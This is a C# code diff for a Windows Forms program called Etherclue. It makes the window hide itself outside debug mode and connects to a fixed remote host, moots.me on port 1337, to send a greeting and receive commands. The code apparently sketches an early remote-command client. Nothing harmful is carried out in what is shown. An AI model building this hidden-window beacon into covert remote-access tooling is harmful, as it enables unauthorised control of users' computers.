@@ -12,7 +12,7 @@ namespace Etherclue
 {
     public partial class EtherclueMain : Form
     {
-        Encryption encryption = new Encryption();
+        
         clsSocket socket;
         public EtherclueMain()
         {
@@ -24,21 +24,27 @@ namespace Etherclue
             
         }
 
-        private void CheckCommand(string cmd)
+        private void CheckCommand(Command cmd)
         {
-            MessageBox.Show(cmd);
-            socket.Send("Testing");
+            if(Program.debug)
+                MessageBox.Show(cmd.GottenRequest());
+            //socket.Send(new Command(cmd.GottenRequest(), true).SendRequest());
         }
 
         private void EtherclueMain_Load(object sender, EventArgs e)
         {
-            socket = new clsSocket("moots.me", 1337);
-            this.Hide();
-            socket.Send("Test");
-            while (socket.IsConnected())
+            if (!Program.debug)
             {
-                CheckCommand(socket.Receive());
+                this.Hide();
             }
+            socket = new clsSocket("moots.me", 1337);
+            socket.Send(new Command("Hello World", true).SendRequest());
+            CheckCommand(new Command(socket.Receive(), false));
+        }
+
+        private void EtherclueMain_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            socket.Close();
         }
     }
 }
